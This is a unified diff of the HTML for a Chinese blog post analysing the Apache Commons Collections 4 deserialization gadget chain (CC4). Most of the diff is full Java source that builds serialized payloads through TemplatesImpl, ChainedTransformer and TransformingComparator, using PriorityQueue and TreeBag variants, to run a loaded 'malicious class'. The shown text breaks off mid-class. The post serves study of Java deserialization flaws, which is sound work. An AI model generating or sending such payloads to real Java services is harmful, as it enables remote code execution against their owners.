@@ -211,7 +211,7 @@
     <h1 class="post-title">
       CommonsCollections4分析
     </h1>
-    <div class="post-meta"><span title='2022-10-28 19:36:38 +0800 +0800'>2022-10-28</span>&nbsp;·&nbsp;7 分钟&nbsp;·&nbsp;Reus09
+    <div class="post-meta">&lt;span title=&#39;2022-10-28 19:36:38 &#43;0800 &#43;0800&#39;&gt;2022-10-28&lt;/span&gt;&amp;nbsp;·&amp;nbsp;7 分钟&amp;nbsp;·&amp;nbsp;Reus09
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -406,22 +406,22 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC4<span style="color:#f92672">;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC4;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.Transformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ChainedTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ConstantTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InstantiateTransformer<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.Templates<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.Templates;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @ClassName CC4
@@ -430,50 +430,50 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Date 2022/10/28 19:59
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Version 1.0
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> **/</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC4</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC4</span> {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC4.bin&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC4.bin&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> NoSuchFieldException<span style="color:#f92672">,</span> IllegalAccessException<span style="color:#f92672">,</span> ClassNotFoundException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 读取恶意类 bytes[]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        InputStream inputStream <span style="color:#f92672">=</span> CC4<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getResourceAsStream</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Calc.class&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>      bytes       <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()];</span>
-</span></span><span style="display:flex;"><span>        inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">(</span>bytes<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 读取恶意类 bytes[]</span>
+</span></span><span style="display:flex;"><span>        InputStream inputStream <span style="color:#f92672">=</span> CC4.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getResourceAsStream</span>(<span style="color:#e6db74">&#34;Calc.class&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>      bytes       <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>inputStream.<span style="color:#a6e22e">available</span>()<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        inputStream.<span style="color:#a6e22e">read</span>(bytes);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 TemplatesImpl 对象
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        TemplatesImpl tmpl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>        Field bytecodes <span style="color:#f92672">=</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        bytecodes<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        bytecodes<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>bytes<span style="color:#f92672">});</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// _name 不能为空
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field name <span style="color:#f92672">=</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 TemplatesImpl 对象</span>
+</span></span><span style="display:flex;"><span>        TemplatesImpl tmpl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        Field bytecodes <span style="color:#f92672">=</span> TemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
+</span></span><span style="display:flex;"><span>        bytecodes.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        bytecodes.<span style="color:#a6e22e">set</span>(tmpl, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bytes});
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// _name 不能为空</span>
+</span></span><span style="display:flex;"><span>        Field name <span style="color:#f92672">=</span> TemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
+</span></span><span style="display:flex;"><span>        name.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        name.<span style="color:#a6e22e">set</span>(tmpl, <span style="color:#e6db74">&#34;reus09&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 设计 ChainedTransformer ，将tmpl作为参数，传入我们实例化的对象Templates.class里面
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ChainedTransformer chain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>TrAXFilter<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InstantiateTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Templates<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>tmpl<span style="color:#f92672">})</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">});</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 将构造好的恶意chain 通过comparator 进行装饰
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        TransformingComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator<span style="color:#f92672">(</span>chain<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 设计 ChainedTransformer ，将tmpl作为参数，传入我们实例化的对象Templates.class里面</span>
+</span></span><span style="display:flex;"><span>        ChainedTransformer chain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Templates.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tmpl})
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 将构造好的恶意chain 通过comparator 进行装饰</span>
+</span></span><span style="display:flex;"><span>        TransformingComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(chain);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 在初始化时不带入 comparator， 防止，在加入元素的时候就产生攻击。
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PriorityQueue<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;reus&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;9&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 在初始化时不带入 comparator， 防止，在加入元素的时候就产生攻击。</span>
+</span></span><span style="display:flex;"><span>        PriorityQueue<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;</span>(2);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#34;reus&#34;</span>);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#34;9&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射设置 PriorityQueue的comparator元素
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field field <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.PriorityQueue&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;comparator&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>queue<span style="color:#f92672">,</span> comparator<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射设置 PriorityQueue的comparator元素</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.PriorityQueue&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;comparator&#34;</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(queue, comparator);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObjectToFile</span><span style="color:#f92672">(</span>queue<span style="color:#f92672">,</span> fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">readFileObject</span><span style="color:#f92672">(</span>fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">writeObjectToFile</span>(queue, fileName);
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">readFileObject</span>(fileName);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>攻击效果：</p>
@@ -504,25 +504,25 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 声明一个无用的transformer        
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Transformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;toString&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{});</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 声明一个无用的transformer        </span>
+</span></span><span style="display:flex;"><span>Transformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;toString&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{});
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 设计 ChainedTransformer ，将tmpl作为参数，传入我们实例化的对象Templates.class里面
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ChainedTransformer chain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>TrAXFilter<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InstantiateTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Templates<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>tmpl<span style="color:#f92672">})</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">});</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 设计 ChainedTransformer ，将tmpl作为参数，传入我们实例化的对象Templates.class里面</span>
+</span></span><span style="display:flex;"><span>ChainedTransformer chain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Templates.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tmpl})
+</span></span><span style="display:flex;"><span>        });
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 用没有威胁作用的transformer来初始化一个TransformingComparator对象
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>TransformingComparator comparator  <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator<span style="color:#f92672">(</span>transformer<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 用没有威胁作用的transformer来初始化一个TransformingComparator对象</span>
+</span></span><span style="display:flex;"><span>TransformingComparator comparator  <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(transformer);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// prepare CommonsCollections object entry point
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>TreeBag tree <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TreeBag<span style="color:#f92672">(</span>comparator<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>tree<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 反射将TransformingComparator对应的transformer替换为可以执行恶意代码的
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Field field <span style="color:#f92672">=</span> TransformingComparator<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;transformer&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>field<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>field<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>comparator<span style="color:#f92672">,</span>chain<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// prepare CommonsCollections object entry point</span>
+</span></span><span style="display:flex;"><span>TreeBag tree <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TreeBag(comparator);
+</span></span><span style="display:flex;"><span>tree.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 反射将TransformingComparator对应的transformer替换为可以执行恶意代码的</span>
+</span></span><span style="display:flex;"><span>Field field <span style="color:#f92672">=</span> TransformingComparator.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;transformer&#34;</span>);
+</span></span><span style="display:flex;"><span>field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>field.<span style="color:#a6e22e">set</span>(comparator,chain);
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里需要讲一下，为什么调用<code>add</code>方法前注册的transformer是无用的，添加元素之后，需要通过反射，将transformer修改为我们需要的恶意transformer。</p>
@@ -602,22 +602,22 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC4<span style="color:#f92672">;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC4;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.Transformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.bag.TreeBag<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ChainedTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ConstantTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InstantiateTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InvokerTransformer<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.bag.TreeBag;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InvokerTransformer;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.Templates<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.Templates;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @ClassName CC4WithTreeBag
@@ -626,45 +626,45 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Date 2022/10/28 20:03
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Version 1.0
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> **/</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC4WithTreeBag</span> <span style="color:#f92672">{</span>
